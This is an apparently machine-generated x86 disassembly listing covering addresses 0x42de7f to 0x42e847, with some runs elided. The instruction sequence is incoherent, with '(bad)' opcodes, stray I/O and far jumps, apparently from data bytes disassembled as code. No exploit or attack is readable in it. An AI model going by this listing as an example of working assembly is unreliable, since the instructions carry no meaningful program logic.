  42de7f:	das    
  42de80:	pop    esp
  42de81:	sbb    bh,al
  42de83:	and    BYTE PTR [eax],dh
  42de85:	jmp    0x42de88
  42de87:	add    BYTE PTR [ecx+eax*1],al
  42de8a:	add    BYTE PTR [eax],al
  42de8c:	mov    esi,0x1a87973a
  42de91:	sbb    eax,0xa89c8090
  42de96:	stos   DWORD PTR es:[edi],eax
  42de97:	lods   eax,DWORD PTR ds:[esi]
  42de98:	add    BYTE PTR [eax+edx*1],bh
  42de9b:	std    
  42de9c:	ss dec edx
  42de9e:	xchg   BYTE PTR [edi],cl
  42dea0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dea1:	bound  ebp,QWORD PTR [edx-0xd]
  42dea4:	imul   ebp,DWORD PTR [edx],0xa8f127
  42deaa:	repz ret 
  42deac:	in     eax,dx
  42dead:	out    dx,eax
  42deae:	rcl    BYTE PTR [edi-0x3e],cl
  42deb1:	sbb    cl,cl
  42deb3:	fs ds jl 0x42dea0
  42deb7:	jl     0x42defc
  42deb9:	pop    es
  42deba:	jg     0x42de92
  42debc:	and    esi,DWORD PTR [eax+0x5c41664c]
  42dec2:	aad    0xa
  42dec4:	pop    ebx
  42dec5:	mov    ch,0x5c
  42dec7:	push   ds
  42dec8:	and    BYTE PTR [eax+ecx*4+0x42],bl
  42decc:	pop    ebp
  42decd:	jg     0x42dec3
  42decf:	jge    0x42dec5
  42ded1:	sahf   
  42ded2:	scas   eax,DWORD PTR es:[edi]
  42ded3:	mov    ecx,0x7dfd0879
  42ded8:	mov    cs,ecx
  42deda:	adc    al,0x7b
  42dedc:	add    BYTE PTR [ecx],dh
  42dede:	jl     0x42df4c
  42dee0:	lds    edx,FWORD PTR [ebx+0x41]
  42dee3:	mov    ch,0xc4
  42dee5:	add    DWORD PTR [esi+0x2d658d1f],eax
  42deeb:	not    BYTE PTR [edi+0x1695c828]
  42def1:	cmp    edi,ecx
  42def3:	bound  esi,QWORD PTR [ecx-0x7164f686]
  42def9:	pop    es
  42defa:	jae    0x42deed
  42defc:	dec    ecx
  42defd:	retf   0xe655
  42df00:	dec    esp
  42df01:	rcl    BYTE PTR [eax],cl
  42df03:	ret    0x6231
  42df06:	xchg   edi,eax
  42df07:	out    dx,eax
  42df08:	lods   eax,DWORD PTR ds:[esi]
  42df09:	int3   
  42df0a:	mov    al,ds:0xf9c94f60
  42df0f:	(bad)  
  42df10:	fist   DWORD PTR [ecx+0x1b]
  42df13:	cmp    ah,bl
  42df15:	jo     0x42df62
  42df17:	lods   eax,DWORD PTR ds:[esi]
  42df18:	hlt    
  42df19:	or     eax,0xd81e55a
  42df1e:	and    ah,BYTE PTR [esi-0x35]
  42df21:	sbb    eax,0x4f96d4e0
  42df26:	loop   0x42df81
  42df28:	lods   al,BYTE PTR ds:[esi]
  42df29:	push   0xaed89334
  42df2e:	(bad)  
  42df2f:	push   0xffffffed
  42df31:	hlt    
  42df32:	mov    al,0xc5
  42df34:	cwde   
  42df35:	jecxz  0x42dfa3
  42df37:	sar    BYTE PTR [eax+ebp*1-0x29b204fb],0x55
  42df3f:	add    DWORD PTR [edi-0x7a542300],eax
  42df45:	ds pop esp
  42df47:	push   edx
  42df48:	fild   QWORD PTR [eax]
  42df4a:	ret    0xfc0d
  42df4d:	repnz daa 
  42df4f:	xchg   ebx,eax
  42df50:	mov    edx,0xf44dc9e7
  42df55:	psraw  mm0,QWORD PTR [eax-0x5a]
  42df59:	mov    ebp,0xbbf44f1a
  42df5e:	lds    esi,FWORD PTR [edx]
  42df60:	cld    
  42df61:	dec    BYTE PTR [ebp-0x69025426]
  42df67:	sub    BYTE PTR [ecx],ah
  42df69:	and    DWORD PTR [ebx+0x74],esp
  42df6c:	call   0x2215:0x3961bf86
  42df73:	mov    ah,BYTE PTR [edx-0x62]
  42df76:	idiv   BYTE PTR [ebp-0xe]
  42df79:	(bad)  
  42df7a:	(bad)  
  42df7b:	or     DWORD PTR ss:[esi],0x4
  42df7f:	ret    
  42df80:	sbb    ah,ah
  42df82:	test   BYTE PTR [ecx],dl
  42df84:	test   al,0xa8
  42df86:	add    BYTE PTR [ebp+0x33],cl
  42df89:	lods   eax,DWORD PTR ds:[esi]
  42df8a:	js     0x42df4f
  42df8c:	sub    bh,al
  42df8e:	js     0x42df52
	...
  42dff4:	add    bh,dh
  42dff6:	jb     0x42df9e
  42dff8:	(bad)  
  42dff9:	scas   al,BYTE PTR es:[edi]
  42dffa:	(bad)  
  42dffb:	dec    BYTE PTR [edi-0x30]
  42dffe:	fisttp WORD PTR [esi+0x1b]
  42e001:	inc    esp
  42e002:	or     eax,0x1ec34f6
  42e007:	add    BYTE PTR [ecx+eax*1],al
  42e00a:	add    BYTE PTR [eax],al
  42e00c:	dec    eax
  42e00d:	adc    eax,0xbf16eaed
  42e012:	jl     0x42e05a
  42e014:	mov    dl,BYTE PTR [edi]
  42e016:	loop   0x42e04d
  42e018:	or     eax,0xb4e03eba
  42e01d:	(bad)  
  42e01e:	jne    0x42dfac
  42e020:	mov    WORD PTR [esi+0x17],fs
  42e023:	test   DWORD PTR [eax],esp
  42e025:	mov    DWORD PTR [ebx-0x6390f33b],0xee7c6969
  42e02f:	sub    BYTE PTR [ebx+0x53],al
  42e032:	fs jge 0x42e014
  42e035:	je     0x42dfc2
  42e037:	pop    esi
  42e038:	mov    esi,0x1b2b0563
  42e03d:	xchg   ebx,eax
  42e03e:	rcr    BYTE PTR [esi+0x53],1
  42e041:	icebp  
  42e042:	mov    ah,0x44
  42e044:	sbb    al,0x9b
  42e046:	(bad)  
  42e048:	arpl   WORD PTR [esi+0x3d],bp
  42e04b:	pop    esp
  42e04c:	scas   al,BYTE PTR es:[edi]
  42e04d:	ret    
  42e04e:	popa   
  42e04f:	in     al,dx
  42e050:	les    ebx,FWORD PTR es:[edi+edi*1+0x6cab80b5]
  42e058:	sar    DWORD PTR [eax],0xbf
  42e05b:	mov    al,0x63
  42e05d:	les    edx,FWORD PTR [eax]
  42e05f:	dec    BYTE PTR [eax-0x48fd59d2]
  42e065:	aad    0x82
  42e067:	xor    dh,ch
  42e069:	or     BYTE PTR gs:[eax-0x38],bl
  42e06d:	pop    esp
  42e06e:	mov    esi,0x3b2d1644
  42e073:	stos   DWORD PTR es:[edi],eax
  42e074:	adc    BYTE PTR [esi],ah
  42e076:	mov    dl,0xf4
  42e078:	loope  0x42e0e0
  42e07a:	jecxz  0x42e08d
  42e07c:	mov    DWORD PTR [ecx+0x28],ecx
  42e07f:	bound  ebx,QWORD PTR [ebx]
  42e081:	(bad)  
  42e083:	in     al,0x6f
  42e085:	xlat   BYTE PTR ds:[ebx]
  42e086:	nop
  42e087:	push   ds
  42e088:	ret    0x2f95
  42e08b:	mov    edx,0xe3a52fdc
  42e090:	fbld   TBYTE PTR [eax-0x2316aa64]
  42e096:	sbb    BYTE PTR [edx-0x34d1adac],0xbb
  42e09d:	outs   dx,DWORD PTR ds:[esi]
  42e09e:	xor    ebx,DWORD PTR [edi-0x33f035c7]
  42e0a4:	inc    edx
  42e0a5:	push   cs
  42e0a6:	out    dx,al
  42e0a7:	out    0x36,eax
  42e0a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e0aa:	ret    0xd1de
  42e0ad:	rcr    edi,1
  42e0af:	add    al,0x5e
  42e0b1:	int    0x53
  42e0b3:	mov    dh,0x55
  42e0b5:	lds    ebx,FWORD PTR [esi-0x347602c4]
  42e0bb:	out    0x99,eax
  42e0bd:	sub    al,0x58
  42e0bf:	mov    esi,0xf0a03ef9
  42e0c4:	cld    
  42e0c5:	add    esi,DWORD PTR [ecx+0x2]
  42e0c8:	mov    ebp,0x48448eb1
  42e0cd:	push   es
  42e0ce:	fbld   TBYTE PTR [esi]
  42e0d0:	inc    ebx
  42e0d1:	enter  0x2bcb,0x25
  42e0d5:	mov    ds:0x3ffc6403,al
  42e0da:	rep stos BYTE PTR es:[edi],al
  42e0dc:	push   ss
  42e0dd:	gs push esi
  42e0df:	add    eax,0xa72651be
  42e0e4:	sahf   
  42e0e5:	adc    DWORD PTR [esi+esi*2],esi
  42e0e8:	idiv   BYTE PTR [edi+0xbd4cabd]
  42e0ee:	test   al,0x3a
  42e0f0:	push   ebp
  42e0f1:	shl    DWORD PTR [ecx+0x116d4e2d],cl
  42e0f7:	sbb    al,0x61
  42e0f9:	jmp    0x42e102
  42e0fb:	and    eax,0xec3d535f
  42e100:	je     0x42e17d
  42e102:	adc    BYTE PTR [esi+eax*4+0x558961e3],0x72
  42e10a:	add    DWORD PTR [ecx-0x50],esp
  42e10d:	xchg   edi,eax
  42e10e:	ds push edi
	...
  42e174:	mov    eax,ds:0x7e061ecf
  42e179:	xlat   BYTE PTR ds:[ebx]
  42e17a:	mov    ecx,0x35bb80ef
  42e17f:	xchg   edi,eax
  42e180:	rcl    cl,cl
  42e182:	mov    eax,ds:0x1ed3830
  42e187:	add    BYTE PTR [ecx+eax*1],al
  42e18a:	add    BYTE PTR [eax],al
  42e18c:	and    BYTE PTR [edi-0x6d020d2c],dh
  42e192:	xor    BYTE PTR [esi],cl
  42e194:	in     al,0x26
  42e196:	add    al,0xae
  42e198:	mov    eax,ds:0x1d7a9438
  42e19d:	mov    ebp,0x9a5c627e
  42e1a2:	ja     0x42e15f
  42e1a4:	push   edi
  42e1a5:	mov    edx,0xa73dd518
  42e1aa:	retf   
  42e1ab:	or     ebp,DWORD PTR [eax-0x72d1aaee]
  42e1b1:	icebp  
  42e1b2:	pushf  
  42e1b3:	call   0x6773:0x20418ed
  42e1ba:	jmp    0x42e160
  42e1bc:	xchg   ebx,eax
  42e1bd:	and    BYTE PTR [esi+0xddd3999],0x2a
  42e1c4:	je     0x42e21b
  42e1c6:	sbb    ch,ah
  42e1c8:	push   es
  42e1c9:	call   0xe94e:0x8b6ada7a
  42e1d0:	(bad)  
  42e1d1:	clc    
  42e1d2:	lock xchg BYTE PTR [esi-0x6a],al
  42e1d6:	sub    BYTE PTR [ebx-0x48],al
  42e1d9:	push   0xfeda76eb
  42e1de:	lods   eax,DWORD PTR ds:[esi]
  42e1df:	in     eax,0x21
  42e1e1:	fnstenv [eax]
  42e1e3:	jle    0x42e21b
  42e1e5:	cmp    bh,bl
  42e1e7:	add    bh,BYTE PTR [esi+0x55]
  42e1ea:	and    BYTE PTR [edx-0x34cd01b],ah
  42e1f0:	inc    ebp
  42e1f1:	lock in al,0xb1
  42e1f4:	add    ebx,ecx
  42e1f6:	jnp    0x42e1b2
  42e1f8:	dec    ebx
  42e1f9:	sbb    edx,DWORD PTR [esi+ecx*1+0x4370b20f]
  42e200:	jno    0x42e19f
  42e202:	stc    
  42e203:	cmp    DWORD PTR [ebx+0x2e6f752],ebx
  42e209:	sub    DWORD PTR [ebx+0xcfb53fd],esi
  42e20f:	push   cs
  42e210:	sub    DWORD PTR [esi+ebp*1+0x17],edi
  42e214:	mov    eax,0x8993c295
  42e219:	jbe    0x42e218
  42e21b:	in     al,dx
  42e21c:	arpl   bp,cx
  42e21e:	jae    0x42e262
  42e220:	jo     0x42e201
  42e222:	sbb    ch,dh
  42e224:	mov    dh,0x9
  42e226:	clc    
  42e227:	imul   ebx,DWORD PTR [eax-0x2c503d97],0x28e996d7
  42e231:	jecxz  0x42e26e
  42e233:	ret    
  42e234:	cmp    edi,ebp
  42e236:	push   0xffffffa3
  42e238:	fcmovnb st,st(0)
  42e23a:	jmp    0x42e1c1
  42e23c:	cmp    eax,0x80cd8859
  42e241:	sub    ecx,DWORD PTR [edi+0x4a]
  42e244:	push   ss
  42e245:	(bad)  
  42e246:	push   0xffffff80
  42e248:	test   BYTE PTR [esi-0x43],bl
  42e24b:	mov    DWORD PTR [edx],ebp
  42e24d:	ds dec esp
  42e24f:	inc    edx
  42e250:	xor    BYTE PTR [esi+ecx*4-0x61c62641],al
  42e257:	push   0x7d1e04aa
  42e25c:	rcl    BYTE PTR [ebx+0x61c0e305],cl
  42e262:	jle    0x42e2c9
  42e264:	jmp    0x154:0xf4392ceb
  42e26b:	loopne 0x42e1f5
  42e26d:	mov    ecx,0xd2141ee4
  42e272:	cmp    DWORD PTR [edx],0xdd18acf1
  42e278:	sbb    BYTE PTR [ecx-0x65b9bf27],dh
  42e27e:	cmp    DWORD PTR [ebx-0x13421621],0xfc3c4c06
  42e288:	ins    BYTE PTR es:[edi],dx
  42e289:	mov    ds:0xd3a15fc4,eax
  42e28e:	sahf   
  42e28f:	fld    DWORD PTR [eax]
	...
  42e2f1:	add    BYTE PTR [eax],al
  42e2f3:	add    BYTE PTR [ebp-0x655875c3],ch
  42e2f9:	mov    bh,0xad
  42e2fb:	aas    
  42e2fc:	mov    ebx,0x79199140
  42e301:	icebp  
  42e302:	xchg   BYTE PTR [edi+0x1ee3c],cl
  42e308:	add    al,0x1
  42e30a:	add    BYTE PTR [eax],al
  42e30c:	(bad)  
  42e30d:	repz sub DWORD PTR [edx-0x164667ff],0x62a579e4
  42e318:	jl     0x42e353
  42e31a:	pushf  
  42e31b:	pop    esi
  42e31c:	xlat   BYTE PTR ds:[ebx]
  42e31d:	fs scas eax,DWORD PTR es:[edi]
  42e31f:	(bad)  
  42e320:	mov    edx,0x4dfb37eb
  42e325:	xchg   edx,eax
  42e326:	xor    eax,DWORD PTR [esi+0x46900cd2]
  42e32c:	jo     0x42e2f8
  42e32e:	(bad)  
  42e330:	sbb    ah,bl
  42e332:	popf   
  42e333:	jmp    0x7ef5:0x5349aaea
  42e33a:	pushf  
  42e33b:	jo     0x42e349
  42e33d:	(bad)  
  42e33e:	xor    ah,BYTE PTR cs:[esi+0x73]
  42e342:	adc    eax,0x169ea937
  42e347:	aaa    
  42e348:	sahf   
  42e349:	xor    eax,edx
  42e34b:	cdq    
  42e34c:	test   al,0x31
  42e34e:	pop    ds
  42e34f:	adc    bh,BYTE PTR [ebx+0x7f99faca]
  42e355:	sti    
  42e356:	mov    eax,0x757f51c4
  42e35b:	std    
  42e35c:	jo     0x42e2e2
  42e35e:	hlt    
  42e35f:	out    dx,al
  42e360:	cmp    BYTE PTR [ecx-0x6cd99edb],ch
  42e366:	sbb    edi,DWORD PTR [ecx-0x1bbee5f5]
  42e36c:	or     DWORD PTR [ebx],ecx
  42e36e:	in     al,0xc6
  42e370:	cmovnp edx,DWORD PTR [eax+ecx*4+0x67822d99]
  42e378:	rcr    BYTE PTR [ebx-0x21],0x4f
  42e37c:	loope  0x42e322
  42e37e:	adc    eax,edx
  42e380:	pop    ss
  42e381:	jno    0x42e3c3
  42e383:	jne    0x42e349
  42e385:	iret   
  42e386:	fucomi st,st(0)
  42e388:	dec    ecx
  42e389:	jmp    0xaa2:0x6badff3b
  42e390:	loope  0x42e3e6
  42e392:	cmp    BYTE PTR [ebx+0x55],0xc6
  42e396:	(bad)  
  42e398:	mov    dh,0x55
  42e39a:	push   ss
  42e39b:	aam    0xe1
  42e39d:	ja     0x42e3a0
  42e39f:	mov    esp,0xa215f9a7
  42e3a4:	sbb    DWORD PTR [edi-0xf],0xb630217a
  42e3ab:	or     edx,DWORD PTR [esi]
  42e3ad:	add    BYTE PTR [ecx+0x23],cl
  42e3b0:	mov    bl,0x23
  42e3b2:	mov    ah,0xa8
  42e3b4:	stos   DWORD PTR es:[edi],eax
  42e3b5:	pop    eax
  42e3b6:	or     ah,BYTE PTR [eax+0x51]
  42e3b9:	pop    edi
  42e3ba:	scas   al,BYTE PTR es:[edi]
  42e3bb:	(bad)  
  42e3bc:	rcr    DWORD PTR [edi+0x3e],1
  42e3bf:	loop   0x42e354
  42e3c1:	pop    ebx
  42e3c2:	add    ebp,ebp
  42e3c4:	imul   edi,edx,0x77edf814
  42e3ca:	out    dx,eax
  42e3cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e3cc:	mov    bl,0xc6
  42e3ce:	out    dx,eax
  42e3cf:	ins    BYTE PTR es:[edi],dx
  42e3d0:	xchg   DWORD PTR [esi+ebp*8],edi
  42e3d3:	fwait
  42e3d4:	jg     0x42e3e6
  42e3d6:	add    DWORD PTR [esi],edi
  42e3d8:	outs   dx,DWORD PTR ds:[esi]
  42e3d9:	mov    bl,0xe0
  42e3db:	lock xchg edx,eax
  42e3dd:	push   0x1f
  42e3df:	ret    
  42e3e0:	mov    fs,WORD PTR [eax+0x38]
  42e3e3:	push   ebp
  42e3e4:	outs   dx,BYTE PTR ds:[esi]
  42e3e5:	pop    es
  42e3e6:	inc    ebx
  42e3e7:	imul   eax,DWORD PTR [ecx+eiz*1+0x59],0x7f8e1dcc
  42e3ef:	popa   
  42e3f0:	push   esp
  42e3f1:	xchg   DWORD PTR [edx],esp
  42e3f3:	enter  0x298d,0xca
  42e3f7:	xchg   DWORD PTR [edx+0x63],eax
  42e3fa:	mov    dh,0x5a
  42e3fc:	stos   BYTE PTR es:[edi],al
  42e3fd:	sti    
  42e3fe:	mov    esp,0x24bc427d
  42e403:	les    esi,FWORD PTR [esi]
  42e405:	fwait
  42e406:	shl    DWORD PTR [ebp+0x77],0xd0
  42e40a:	xor    eax,0xdc277681
  42e40f:	adc    eax,DWORD PTR [eax]
	...
  42e471:	add    BYTE PTR [eax],al
  42e473:	add    dl,ah
  42e475:	mov    ebp,0xe7dfc7dc
  42e47a:	sti    
  42e47b:	mov    ebp,0xe093f290
  42e480:	xor    edx,ecx
  42e482:	mov    eax,0x1ef40a9
  42e487:	add    BYTE PTR [ecx+eax*1],al
  42e48a:	add    BYTE PTR [eax],al
  42e48c:	nop
  42e48d:	pop    ebx
  42e48e:	(bad)  
  42e48f:	jmp    0xfc89c001
  42e494:	addr16 es nop
  42e497:	cmc    
  42e498:	dec    ecx
  42e499:	lahf   
  42e49a:	ja     0x42e4e5
  42e49c:	scas   eax,DWORD PTR es:[edi]
  42e49d:	inc    edx
  42e49e:	adc    eax,0x1507da85
  42e4a3:	test   DWORD PTR [esi+0x2d],edx
  42e4a6:	pushf  
  42e4a7:	sar    DWORD PTR [eax-0x6b],0xbe
  42e4ab:	dec    ebp
  42e4ac:	imul   ecx,DWORD PTR [ebx-0x253c7ee7],0x68
  42e4b3:	std    
  42e4b4:	jmp    edx
  42e4b6:	add    DWORD PTR [ebp+eiz*4-0xd],ebx
  42e4ba:	mov    bh,0x44
  42e4bc:	popf   
  42e4bd:	retf   
  42e4be:	sub    DWORD PTR [ebx+0x7d],edi
  42e4c1:	stos   DWORD PTR es:[edi],eax
  42e4c2:	(bad)  
  42e4c5:	adc    ch,bh
  42e4c7:	(bad)  
  42e4c8:	pop    eax
  42e4c9:	ins    DWORD PTR es:[edi],dx
  42e4ca:	mov    eax,ds:0x87c3e20c
  42e4cf:	js     0x42e4ff
  42e4d1:	mov    dl,0x48
  42e4d3:	jg     0x42e50f
  42e4d5:	ror    BYTE PTR [ecx+0x5a],1
  42e4d8:	(bad)  [esi-0x62]
  42e4db:	inc    edi
  42e4dc:	cmp    al,BYTE PTR [esp+edx*1+0x21766e92]
  42e4e3:	test   DWORD PTR [edi-0xfcfc11c],ebp
  42e4e9:	xor    ch,ah
  42e4eb:	scas   eax,DWORD PTR es:[edi]
  42e4ec:	sub    al,0x30
  42e4ee:	aaa    
  42e4ef:	pop    ss
  42e4f0:	test   al,0x16
  42e4f2:	aad    0xa2
  42e4f4:	jmp    0x890f7295
  42e4f9:	push   ss
  42e4fa:	fisttp WORD PTR [ebx+0x424783c9]
  42e500:	aad    0x5
  42e502:	mov    ds:0x460641ff,al
  42e507:	add    eax,0x62a5c29d
  42e50c:	add    DWORD PTR [ecx],edi
  42e50e:	sbb    dl,bl
  42e510:	push   esp
  42e511:	adc    ah,dl
  42e513:	ret    
  42e514:	xchg   ebp,eax
  42e515:	fisttp QWORD PTR [ecx-0x44df6ada]
  42e51b:	jnp    0x42e4f6
  42e51d:	adc    BYTE PTR ds:0x90a7d68d,ch
  42e523:	shr    eax,0x3c
  42e526:	xor    BYTE PTR [ecx],ch
  42e528:	pop    ds
  42e529:	cmp    edx,DWORD PTR [edi-0x4cf98279]
  42e52f:	fwait
  42e530:	sbb    cl,BYTE PTR [esi]
  42e532:	in     al,dx
  42e533:	mov    al,ds:0x6ee2019a
  42e538:	in     eax,dx
  42e539:	imul   edx,DWORD PTR [eax],0xf03aaccb
  42e53f:	xor    BYTE PTR [edi-0x2e8e356b],0x6b
  42e546:	pop    ebx
  42e547:	nop
  42e548:	inc    edx
  42e549:	psllq  mm6,mm0
  42e54c:	pop    ds
  42e54d:	xchg   edi,eax
  42e54e:	inc    esp
  42e54f:	cmp    eax,0x37269b7f
  42e554:	sub    DWORD PTR [ecx+0x790156a0],edi
  42e55a:	and    DWORD PTR [ebp+0x137e98ed],ecx
  42e560:	push   ds
  42e561:	mov    bh,0xf4
  42e563:	mov    bl,0xe4
  42e565:	pop    esi
  42e566:	gs aaa 
  42e568:	lds    edi,FWORD PTR [edx+0x1f]
  42e56b:	mov    al,ds:0xeb76a68a
  42e570:	fstp   QWORD PTR [esi-0x7e]
  42e573:	xchg   DWORD PTR [edx],esi
  42e575:	and    dh,dh
  42e577:	scas   al,BYTE PTR es:[edi]
  42e578:	inc    ecx
  42e579:	retf   
  42e57a:	call   0xbfb5:0x50458887
  42e581:	sub    BYTE PTR [esi+0x31],dl
  42e584:	cld    
  42e585:	mov    edx,0xfd8aec73
  42e58a:	ins    DWORD PTR es:[edi],dx
  42e58b:	inc    ebx
  42e58c:	pop    edx
  42e58d:	xor    BYTE PTR [esi+0x2e],cl
	...
  42e5f3:	add    BYTE PTR [ebp+0x38],dl
  42e5f6:	into   
  42e5f7:	adc    bh,ch
  42e5f9:	neg    bh
  42e5fb:	jge    0x42e58f
  42e5fd:	xchg   ebp,eax
  42e5fe:	jns    0x42e631
  42e600:	je     0x42e5ce
  42e602:	sbb    BYTE PTR [ecx+0x44],cl
  42e605:	lock add DWORD PTR [eax],eax
  42e608:	add    al,0x1
  42e60a:	add    BYTE PTR [eax],al
  42e60c:	in     al,dx
  42e60d:	mov    ch,0xb
  42e60f:	cmc    
  42e610:	inc    eax
  42e611:	push   edi
  42e612:	test   DWORD PTR [ecx+ebx*8-0x42a21033],ebp
  42e619:	adc    eax,0x8f84b8ef
  42e61e:	out    0x13,eax
  42e620:	jecxz  0x42e5c9
  42e622:	lock add al,0xce
  42e625:	xchg   edx,eax
  42e626:	and    edi,DWORD PTR [ebx+0xaffc490]
  42e62c:	push   esp
  42e62d:	or     al,0x81
  42e62f:	and    BYTE PTR [ebx],bh
  42e631:	cmp    eax,0x412aa1c1
  42e636:	xor    DWORD PTR [ebx],0xffffffae
  42e639:	cmp    eax,0x44324754
  42e63e:	pop    es
  42e63f:	sbb    DWORD PTR [ebp-0x5b],eax
  42e642:	lods   al,BYTE PTR ds:[esi]
  42e643:	mov    ebx,es
  42e645:	xor    DWORD PTR [ecx-0x34],ecx
  42e648:	fs scas al,BYTE PTR es:[edi]
  42e64a:	les    ecx,FWORD PTR [edx]
  42e64c:	loop   0x42e654
  42e64e:	and    bh,BYTE PTR [ecx-0x54]
  42e651:	cmp    al,0x95
  42e653:	adc    BYTE PTR [ebx],bl
  42e655:	mov    bh,cl
  42e657:	sub    BYTE PTR [eax],dl
  42e659:	push   0xffffffc2
  42e65b:	jg     0x42e6a4
  42e65d:	out    dx,al
  42e65e:	shl    BYTE PTR [edx+0x1c],0xeb
  42e662:	cs dec ebp
  42e664:	les    edx,FWORD PTR [ebp+0x4c]
  42e667:	pop    ds
  42e668:	xchg   ebx,eax
  42e669:	ret    
  42e66a:	out    dx,al
  42e66b:	xlat   BYTE PTR ds:[ebx]
  42e66c:	xchg   esi,eax
  42e66d:	sti    
  42e66e:	pusha  
  42e66f:	loopne 0x42e6c7
  42e671:	or     edx,eax
  42e673:	call   FWORD PTR [ebx+edx*4-0x5]
  42e677:	fstp   DWORD PTR [ebx-0x7d0ed445]
  42e67d:	dec    di
  42e67f:	cli    
  42e680:	adc    al,ah
  42e682:	sti    
  42e683:	mov    ds:0x752cbe33,al
  42e688:	adc    edx,DWORD PTR [ecx]
  42e68a:	or     esp,edx
  42e68c:	daa    
  42e68d:	adc    BYTE PTR [ebp+0x42467395],dl
  42e693:	ret    0x56eb
  42e696:	mov    WORD PTR [eax],ss
  42e698:	sbb    eax,0xe45e0d50
  42e69d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e69e:	popa   
  42e69f:	hlt    
  42e6a0:	inc    esp
  42e6a1:	pushf  
  42e6a2:	jb     0x42e704
  42e6a4:	in     al,0xc3
  42e6a6:	fistp  DWORD PTR [ebp+0x5a]
  42e6a9:	clc    
  42e6aa:	iret   
  42e6ab:	call   0x50440329
  42e6b0:	not    BYTE PTR [edx+0x27]
  42e6b3:	dec    esp
  42e6b4:	stos   BYTE PTR es:[edi],al
  42e6b5:	cmc    
  42e6b6:	adc    eax,0x160efce3
  42e6bb:	iret   
  42e6bc:	out    0x5b,eax
  42e6be:	stos   DWORD PTR es:[edi],eax
  42e6bf:	in     eax,dx
  42e6c0:	in     al,dx
  42e6c1:	push   eax
  42e6c2:	sbb    al,0xcd
  42e6c4:	ins    BYTE PTR es:[edi],dx
  42e6c5:	mov    ch,BYTE PTR [esp+ecx*4-0x5d]
  42e6c9:	pushf  
  42e6ca:	cmp    BYTE PTR [ebp-0x7e6b01ce],0xe4
  42e6d1:	jnp    0x42e6d3
  42e6d3:	imul   edx,ecx,0x4b
  42e6d6:	iret   
  42e6d7:	lods   eax,DWORD PTR ds:[esi]
  42e6d8:	ja     0x42e69d
  42e6da:	jae    0x42e72e
  42e6dc:	mov    ?,WORD PTR [eax-0x19]
  42e6df:	jns    0x42e71c
  42e6e1:	outs   dx,DWORD PTR ds:[esi]
  42e6e2:	bound  eax,QWORD PTR [eax+0x63]
  42e6e5:	mov    ecx,0xfed3b003
  42e6ea:	pop    ds
  42e6eb:	fcomi  st,st(7)
  42e6ed:	scas   al,BYTE PTR es:[edi]
  42e6ee:	mov    bl,0x8d
  42e6f0:	mov    ebx,0xd751e430
  42e6f5:	pop    ss
  42e6f6:	cdq    
  42e6f7:	push   0x38
  42e6f9:	adc    edx,DWORD PTR [eax+0x52]
  42e6fc:	pop    ebp
  42e6fd:	mov    ah,0xd5
  42e6ff:	jmp    0x2c40e77d
  42e704:	repnz es dec esi
  42e707:	mov    ebp,0x12902c70
  42e70c:	enter  0x7cd0,0xb8
	...
  42e774:	pop    edx
  42e775:	cmp    DWORD PTR [esi+0x2d],ecx
  42e778:	outs   dx,DWORD PTR ds:[esi]
  42e779:	jg     0x42e7f6
  42e77b:	jg     0x42e7e1
  42e77d:	sub    BYTE PTR [esi],cl
  42e77f:	fcmovbe st,st(7)
  42e781:	(bad)  
  42e782:	sahf   
  42e783:	in     al,0x48
  42e785:	icebp  
  42e786:	add    DWORD PTR [eax],eax
  42e788:	add    al,0x1
  42e78a:	add    BYTE PTR [eax],al
  42e78c:	(bad)  
  42e78d:	fcmove st,st(1)
  42e78f:	mov    bl,0x4d
  42e791:	xchg   esi,eax
  42e792:	mov    ah,0x86
  42e794:	test   DWORD PTR [edi+edi*8-0x162ce0ae],esi
  42e79b:	cdq    
  42e79c:	pop    ds
  42e79d:	repz mov eax,0x87a0f51c
  42e7a3:	dec    edx
  42e7a4:	repz sahf 
  42e7a6:	mul    BYTE PTR [edi-0x33]
  42e7a9:	pop    eax
  42e7aa:	inc    edx
  42e7ab:	stc    
  42e7ac:	adc    ebp,DWORD PTR [edx+0x335ba9d5]
  42e7b2:	ret    
  42e7b3:	inc    edx
  42e7b4:	xchg   esp,eax
  42e7b5:	inc    edx
  42e7b6:	cld    
  42e7b7:	int    0xfd
  42e7b9:	js     0x42e774
  42e7bb:	aas    
  42e7bc:	cli    
  42e7bd:	push   ecx
  42e7be:	nop
  42e7bf:	add    eax,0x61aa1830
  42e7c4:	dec    edi
  42e7c5:	jecxz  0x42e797
  42e7c7:	call   0xe24a34e3
  42e7cc:	cmp    al,0x2b
  42e7ce:	sahf   
  42e7cf:	std    
  42e7d0:	imul   esi,DWORD PTR [ecx+edi*2+0x78],0xe27d1744
  42e7d8:	sub    al,0x56
  42e7da:	hlt    
  42e7db:	lea    esp,[eax]
  42e7dd:	(bad)  
  42e7de:	ret    0xded5
  42e7e1:	inc    eax
  42e7e2:	pop    esp
  42e7e3:	js     0x42e7f6
  42e7e5:	les    ebx,FWORD PTR [ebx+0x37fda29a]
  42e7eb:	jne    0x42e81d
  42e7ed:	sbb    DWORD PTR [edx-0x7a49f6fb],0x36
  42e7f4:	cmc    
  42e7f5:	jo     0x42e7c5
  42e7f7:	test   BYTE PTR [ebx+0x2ad17eba],ah
  42e7fd:	cmc    
  42e7fe:	mov    bl,0x3d
  42e800:	xchg   esp,eax
  42e801:	test   DWORD PTR [ecx],eax
  42e803:	push   ecx
  42e805:	repnz mov ecx,0x5e9cb8aa
  42e80b:	xchg   esi,eax
  42e80c:	push   cs
  42e80d:	lahf   
  42e80e:	sub    dl,BYTE PTR ds:0x82fb06fa
  42e814:	pop    ebp
  42e815:	jo     0x42e7bb
  42e817:	js     0x42e885
  42e819:	mov    ds:0x8799601b,al
  42e81e:	dec    esp
  42e81f:	or     BYTE PTR [ecx+0x4fe6e78a],cl
  42e825:	dec    esp
  42e826:	stos   BYTE PTR es:[edi],al
  42e827:	mov    esp,0xfcea4dec
  42e82c:	or     edx,edx
  42e82e:	cmp    DWORD PTR [ebx+edi*2-0x26],esp
  42e832:	lea    ecx,[edx+0x559798f6]
  42e838:	dec    edx
  42e839:	mov    al,cl
  42e83b:	dec    eax
  42e83c:	inc    esi
  42e83d:	leave  
  42e83e:	mov    DWORD PTR [edi+esi*2],esi
  42e841:	mov    ch,0xd9
  42e843:	mov    ss,esp
  42e845:	adc    al,0xcf
  42e847:	xchg   edx,eax
